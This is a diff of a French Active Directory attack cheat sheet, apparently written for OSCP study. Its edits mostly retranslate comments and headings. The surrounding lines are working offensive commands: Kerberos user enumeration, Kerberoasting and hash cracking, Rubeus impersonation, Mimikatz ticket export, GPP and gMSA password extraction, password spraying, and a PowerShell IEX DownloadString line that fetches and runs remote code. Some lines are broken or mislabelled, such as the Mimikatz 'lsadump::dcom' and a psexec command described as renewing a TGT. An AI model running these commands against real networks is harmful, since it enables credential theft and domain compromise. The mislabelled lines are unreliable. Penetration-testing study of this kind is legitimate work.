@@ -48,7 +48,7 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
 <p class="oscp-command-note">Script shell dans la rubrique « Reconnaissance avec Nmap ».</p>
 
 ```bash
-# Utilisation de Kerbrute
+# Énumération des comptes Kerberos avec Kerbrute
 ./kerbrute_linux_amd64 userenum -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames
 
 # Utilisation de CrackMapExec
@@ -234,10 +234,10 @@ hashcat -m 13100 <ticket_file> <wordlist>
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
-# Request a TGT (Ticket Granting Ticket)
+# Demander un ticket TGT (Ticket Granting Ticket)
 python3 GetTGT.py -dc-ip <dc_ip> <domain>/<username>:<password>
 
-# Request a Service Ticket (TGS)
+# Demander un ticket de service (TGS)
 python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
 
 ```
@@ -246,10 +246,10 @@ python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<t
 <p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>
 
 ```bash
-# Extraire tous les tickets de service pour fissuration hors ligne
+# Extraire les tickets de service pour une attaque hors ligne (offline cracking)
 impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
 
-# Crack les billets extraits avec John l'Éventreur ou Hashcat
+# Casser les mots de passe des tickets extraits avec John the Ripper ou Hashcat
 john --wordlist=<wordlist> <tickets_file>
 # or
 hashcat -m 13100 <tickets_file> <wordlist>
@@ -269,10 +269,10 @@ krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
-# Renew a TGT (for Kerberos ticket manipulation)
+# Renouveler un ticket Kerberos TGT
 python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>
 
-# Perform Kerberos attacks with Rubeus
+# Exécuter des techniques Kerberos avec Rubeus
 rubeus.exe asktgt /user:<username> /rc4:<password>
 rubeus.exe tgtdeleg /user:<username> /rc4:<password>
 rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
@@ -283,7 +283,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
-# Domptez les tickets Kerberos de la mémoire en utilisant Mimikatz
+# Extraire les tickets Kerberos de la mémoire avec Mimikatz
 mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 
 ```
@@ -383,13 +383,13 @@ ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=group)" cn
 # Demande LDAP de base
 ldapsearch -x -H ldap://<target_ip>
 
-# LDAP de base Rechercher un niveau de base
+# Recherche LDAP à la racine de l’annuaire (Base DN)
 ldapsearch -h <target_ip> -x -s base
 
 # Afficher les contextes de nommage LDAP
 ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
 
-# Rechercher dans un nom de domaine de base spécifique
+# Effectuer une recherche à partir d’un DN de base précis (Base DN)
 ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"
 
 # Énumérer les utilisateurs utilisant LDAP
@@ -438,7 +438,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher des mots de passe faibles communs dans des attributs comme la description
 (description=*(123456*|password*|qwerty*|letmein*))
 
-# Général LDAP Filtres de recherche
+# Filtres de recherche LDAP courants
 # Rechercher tous les utilisateurs
 (objectClass=user)
 
@@ -448,13 +448,13 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher tous les groupes
 (objectClass=group)
 
-# Recherche de comptes handicapés
+# Rechercher les comptes désactivés (Disabled Accounts)
 (userAccountControl:1.2.840.113556.1.4.803:=2)
 
-# Recherche de comptes expirés
+# Rechercher les comptes non désactivés avec un mot de passe défini
 (& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))
 
-# Rechercher un abonnement de groupe spécifique
+# Rechercher les membres d’un groupe (Group Membership)
 (&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))
 
 # Rechercher des utilisateurs avec des attributs spécifiques
@@ -463,20 +463,20 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Pour les utilisateurs ayant un titre spécifique
 (title=Manager)
 
-# Specific Attributes
+# Recherche par attribut LDAP
 
 # Recherche du dernier jeu de mots de passe
 (pwdLastSet=*)
 
-# Recherche de comptes avec mot de passe expiré
+# Rechercher les comptes dont pwdLastSet est égal à 0
 (& (objectClass=user)(pwdLastSet<=0))
 
 # Recherche de comptes dans une unité organisationnelle spécifique (OU)
 (distinguishedName=*,OU=Sales,DC=domain,DC=com)
 
-# Security-Related Searches
+# Recherches liées à la sécurité
 
-# Recherche de comptes avec Kerberos pré-authentification désactivée
+# Rechercher les comptes sans préauthentification Kerberos (AS-REP Roasting)
 (userAccountControl:1.2.840.113556.1.4.803:=4194304)
 
 # Recherche de noms principaux de services (SPN)
@@ -488,7 +488,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher des comptes avec des privilèges
 (memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)
 
-# Other Useful Searches
+# Autres recherches LDAP utiles
 
 # Rechercher toutes les unités organisationnelles
 (objectClass=organizationalUnit)
@@ -499,7 +499,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher tous les attributs d'un utilisateur spécifique
 (sAMAccountName=username)
 
-# Recherche de comptes avec notes ou descriptions spécifiques
+# Rechercher les comptes selon leur description
 (description=*keyword*)
 
 # Rechercher tous les objets dans le répertoire
@@ -508,10 +508,10 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Recherche de comptes de service
 (objectCategory=serviceAccount)
 
-# Recherche de comptes avec des abonnements spécifiques de groupe (remplacer 'GroupName')
+# Rechercher les comptes membres du groupe indiqué (GroupName)
 (memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)
 
-# Recherche de comptes informatiques
+# Rechercher les comptes d’ordinateur
 (objectClass=computer)
 
 # Rechercher des utilisateurs dans une unité organisationnelle spécifique (remplacer 'OU=Users')
@@ -531,7 +531,7 @@ Vérifier les ports et les services de la cible autorisée.
 <p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
 
 ```bash
-# Scan Nmap
+# Scanner les ports et services avec Nmap
 nmap -v -p 139,445 [IP]
 nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>
 
@@ -1036,7 +1036,7 @@ Get-NetUser -Delegation
 ```
 
 
-## Noms principaux de service (SPN) Inventaire
+## Inventaire des noms principaux de service (SPN)
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1326,7 +1326,7 @@ crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray
 ```
 
 
-## MS-RPRN Print Spooler Service Exploitation
+## Exploitation du spouleur d’impression (MS-RPRN)
 
 
 <p class="oscp-command-note">Examiner les objets exposés par RPC.</p>
@@ -1475,12 +1475,12 @@ Examiner les objets, les droits et les services du domaine.
 **wsman**
 
 
-## GPP Passwords Abuse (Group Policy Preferences)
+## Exploitation des mots de passe GPP (Group Policy Preferences)
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-### GPP Main Method for Extraction
+### Méthode principale d’extraction des mots de passe GPP
 
 
 <p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>
@@ -1577,7 +1577,7 @@ Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
 ```
 
 
-### SMB Share-SYSVOL
+### Partage SMB SYSVOL
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1621,7 +1621,7 @@ crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp
 ```
 
 
-### Importing the Module
+### Importer le module
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -1643,7 +1643,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 
 
-### De base Usage
+### Utilisation de base
 
 
 **Paramètres et repères :**
@@ -1666,7 +1666,7 @@ Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « De base Usage ».</p>
+<p class="oscp-command-note">Script PowerShell pour les opérations d’énumération de base.</p>
 
 ```powershell
 $SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
@@ -1685,7 +1685,7 @@ Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[doma
 ```
 
 
-### Module-Specific Usage
+### Utilisation des fonctions du module
 
 
 
@@ -1759,7 +1759,7 @@ Invoke-adPEAS -Module Bloodhound -Scope All
 ```
 
 
-#### Manual Découverte of gMSAs
+#### Recherche manuelle des comptes gMSA
 
 
 **Paramètres et repères :**
@@ -1791,7 +1791,7 @@ Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Proper
 `msDS-ManagedPassword`  
 
 
-#### Automated Découverte with BloodHound
+#### Recherche des comptes gMSA avec BloodHound
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1821,7 +1821,7 @@ Find Principals with Unusual Rights on Password Attributes
 ```
 
 
-### Récupération de mot de passe GMSA avec GMSAMot de passeReader
+### Récupération du mot de passe gMSA avec GMSAPasswordReader
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1830,7 +1830,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `GMSAPasswordReader.exe` · `msDS-ManagedPassword`  
 
 
-#### Usage
+#### Utilisation
 
 
 **Paramètres et repères :**
@@ -1910,7 +1910,7 @@ Get-DomainGMSA -Properties msDS-ManagedPassword
 ```
 
 
-## Group Policy Object (GPO) Abuse
+## Exploitation des stratégies de groupe (GPO)
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -2001,7 +2001,7 @@ gpupdate /force
 ```
 
 
-## Enumerating Domain Controller
+## Énumération des contrôleurs de domaine
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -2222,7 +2222,7 @@ nmap --script ldap-search -p389 <DOMAIN_IP>
 ```
 
 
-### Utilisation de Kerbrute
+### Énumération des comptes Kerberos avec Kerbrute
 
 
 <p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>
@@ -2260,7 +2260,7 @@ Get-ADGroup -Filter * | Select-Object Name, GroupScope
 ```
 
 
-### Tips for CrackMapExec Énumération
+### Conseils d’énumération avec CrackMapExec
 
 
 <p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
@@ -2316,7 +2316,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAM
 ```
 
 
-### Shares Énumération
+### Énumération des partages SMB
 
 
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
@@ -2334,7 +2334,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NA
 ```
 
 
-### Group Énumération
+### Énumération des groupes
 
 
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
@@ -2349,7 +2349,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NA
 ```
 
 
-### Politique de mots de passe Énumération
+### Énumération de la politique de mots de passe
 
 
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
@@ -2361,7 +2361,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_N
 ```
 
 
-### Local Accounts Énumération
+### Énumération des comptes locaux
 
 
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
@@ -2373,7 +2373,7 @@ crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth
 ```
 
 
-### LDAP Énumération
+### Énumération LDAP
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -2381,16 +2381,16 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Dump domain users
+# Lister les utilisateurs du domaine
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --users
 
-# Dump domain groups
+# Lister les groupes du domaine
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --groups
 
 ```
 
 
-### MSSQL Énumération
+### Énumération MSSQL
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
